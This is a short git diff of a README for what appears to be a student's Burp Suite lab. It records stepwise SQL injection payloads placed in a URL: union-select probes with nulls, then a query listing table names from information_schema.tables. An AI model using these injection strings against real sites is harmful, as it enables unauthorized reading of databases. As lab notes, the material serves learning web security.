@@ -1,4 +1,5 @@
 # BurpSuite_Lab
+#update git
 first i try add "'+union+select+null--" into Url
 as can we seen, there haven't happen. Then try add "+union+select+null,null--"
 then i changed it in to "+union+select+tale_name,null+from+information_schema.tables--"
